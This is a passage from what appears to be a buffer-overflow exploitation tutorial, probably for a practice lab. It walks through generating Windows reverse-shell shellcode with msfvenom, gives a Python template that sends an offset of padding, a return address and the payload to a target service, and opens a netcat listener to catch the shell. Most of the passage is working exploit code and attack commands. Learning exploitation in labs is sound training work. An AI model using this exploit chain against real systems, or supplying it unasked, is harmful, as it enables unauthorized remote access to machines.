Now that we have done all of that we now gotta generate shell code for  it, we can use msfvenom for it with command 
`msfvenom -p windows/shell_reverse_tcp LHOST=<Your ip> LPORT=<PORT> -a x86 -b <Bad characters> -f python`

note format the bad characters as "\\x00\\x52" etc.

After doing the msfvenom it should return a bunch stuff, and it should be in python because of -f python, just paste below the comment.

```python
import socket
from time import sleep

# Shellcode:


ip, port = "10.10.10.10", 9999 # Change the ip and port
offset = 0  # change this with what you got from step 2
prefix = b"" # change this if necessary and make sure theres a space at the end.
module = b"\xaf\x11\x50\x62" # Change this

try:
	s = socket.socket()
	s.connect((ip, port))
	s.send(prefix + b"A"*offset + module + buf)
except:
	print(f"Something went wrong")

s.close()
```

Now open a terminal and make a netcat listener with the port you gave before when genereting the shellcode
`nc -lnvp <PORT>`

Now execute the code and boom reverse shell.
